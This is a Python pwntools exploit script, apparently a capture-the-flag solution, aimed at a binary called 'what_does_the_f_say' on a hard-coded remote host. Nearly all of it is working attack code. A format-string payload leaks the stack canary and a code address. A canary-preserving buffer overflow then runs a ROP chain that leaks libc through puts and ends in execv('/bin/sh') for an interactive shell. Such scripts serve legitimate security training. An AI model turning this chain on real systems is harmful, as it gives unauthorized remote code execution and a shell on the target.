#!/usr/bin/env python3
from pwn import *

# exploit mode
EXPLOIT=False
LEAK_LIBC=True

DUMMY = 0x6867666564636261
elf = ELF("./given/what_does_the_f_say")
libc = None

def conn():
    global libc
    if args.REMOTE:
        p = remote("165.232.102.34", 30111)
        libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")
    else:
        p = process([elf.path])
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        if args.D:
            gdb.attach(p, """
                    b *warning + 84
                    """)
    return p


def navigate(p, msg=p64(DUMMY)):
    """
    1. Navigate to make more purchase
    2. also leak canary, PIE address
    """
    # choose space drinks
    p.recvuntil(b"1. Space drinks")
    p.recvuntil(b"2. Space food")
    p.sendline(b"1")

    # choose Krptonite vodka
    p.recvuntil(b"1. Milky way (4.90 s.rocks)")
    p.recvuntil(b"2. Kryptonite vodka (6.90 s.rocks)")
    p.recvuntil(b"3. Deathstar(70.00 s.rocks)")
    p.sendline(b"2")

    # VULN: the buffer has format string vulnerability
    p.recvuntil(b"Red or Green Kryptonite?")
    p.sendline(msg)

def navigate_and_leak(p):
    # info: pwndbg
    # buf -0x30(%rbp)
    # canary: -8(%rbp)

    # choose space drinks
    p.recvuntil(b"1. Space drinks")
    p.recvuntil(b"2. Space food")
    p.sendline(b"1")

    # choose Krptonite vodka
    p.recvuntil(b"1. Milky way (4.90 s.rocks)")
    p.recvuntil(b"2. Kryptonite vodka (6.90 s.rocks)")
    p.recvuntil(b"3. Deathstar(70.00 s.rocks)")
    p.sendline(b"2")

    # VULN: the buffer has format string vulnerability
    p.recvuntil(b"Red or Green Kryptonite?\n")
    p.sendline(b"%1$p %13$p %15$p")
    leak = p.recvline()
    drinks_menu_buf, canary, retaddr = leak[:-1].split(b" ")

    # the return address is in <fox_bar>
    # info: objdump
    # 0x1745: call <drinks_menu>
    # 0x174a: ...
    drinks_menu_buf = int(drinks_menu_buf.decode('ascii'), 16)
    canary = int(canary.decode('ascii'), 16)
    retaddr = int(retaddr.decode('ascii'), 16)
    # print(hex(drinks_menu_buf), hex(canary), hex(retaddr))

    elf.address = retaddr - 0x174a
    return drinks_menu_buf, canary


def bufovfl(p, drinks_menu_buf, canary, mode):
    """
    warning_buf: -0x20
    canary:      -0x8(%rbp)
    """
    # info: pwndbg
    warning_buf = drinks_menu_buf - 0x40

    # info: ROPgadget
    rop_rdi = elf.address + 0x18bb
    rop_rsi_r15 = elf.address + 0x18b9

    # info: objdump
    func_setup = elf.address + 0x17a0
    func_warning = elf.address + 0x144a
    plt_puts = elf.address + 0x1030
    plt_printf = elf.address + 0x1050
    got_puts = elf.address + 0x3f90
    got_printf = elf.address + 0x3fa0
    got_memset = elf.address + 0x3fa8
    got_read = elf.address + 0x3fb0
    got_strcmp = elf.address + 0x3fb8
    got_setvbuf = elf.address + 0x3fc0
    got_scanf = elf.address + 0x3fc8
    call_warning = elf.address + 0x1651

    if mode == EXPLOIT:
        padding = b"a" * 0x18 + p64(canary) + p64(DUMMY)
        payload = padding + p64(rop_rdi) + p64(got_puts)
        payload += p64(plt_puts)
        payload += p64(func_setup)
        payload += p64(call_warning)
        p.sendline(payload)

        leaked_addr = p.recvline()
        libc_puts = u64(leaked_addr[:-1].ljust(8, b"\x00"))
        print("libc_puts", hex(libc_puts))
        libc.address = libc_puts - libc.symbols['puts']

        print(p.recvuntil(b"You have less than 20 space rocks! Are you sure"))
        print(p.recvline())
        payload = padding
        payload += p64(rop_rdi) + p64(next(libc.search(b'/bin/sh')))
        payload += p64(rop_rsi_r15) + p64(0x0) + p64(DUMMY)
        payload += p64(libc.symbols['execv'])

        p.sendline(payload)
        p.interactive()

    elif mode == LEAK_LIBC:
        padding = b"/bin/sh".ljust(0x18, b"\x00") + p64(canary) + p64(DUMMY)
        payload = padding + p64(rop_rdi) + p64(got_puts)
        payload += p64(plt_puts)
        payload += p64(rop_rdi) + p64(got_setvbuf)
        payload += p64(plt_puts)
        payload += p64(rop_rdi) + p64(got_read)
        payload += p64(plt_puts)
        p.sendline(payload)

        leaked_addr = p.recvline()
        libc_puts = u64(leaked_addr[:-1].ljust(8, b"\x00"))
        print("puts", hex(libc_puts))

        leaked_addr = p.recvline()
        libc_setvbuf = u64(leaked_addr[:-1].ljust(8, b"\x00"))
        print("setvbuf", hex(libc_setvbuf))

        leaked_addr = p.recvline()
        libc_read = u64(leaked_addr[:-1].ljust(8, b"\x00"))
        print("read", hex(libc_read))


def exploit():

    p = conn()
    mode = LEAK_LIBC if libc is None else EXPLOIT
    if mode == LEAK_LIBC:
        print("LEAK LIBC MODE")
    else:
        print("EXPLOIT MODE")

    # navigate towards vulnerable function <warning>
    curr_srocks = 69.69
    while curr_srocks > 20.0:
        navigate(p)
        curr_srocks -= 6.9

    # Do it one more time, it will pop up another prompt
    # Also, leak some addresses this time
    drinks_menu_buf, canary = navigate_and_leak(p)

    # bufovfl for this answering buffer
    p.recvuntil(b"You have less than 20 space rocks! Are you sure")
    p.recvline()
    bufovfl(p, drinks_menu_buf, canary, mode)


if __name__ == "__main__":
    exploit()
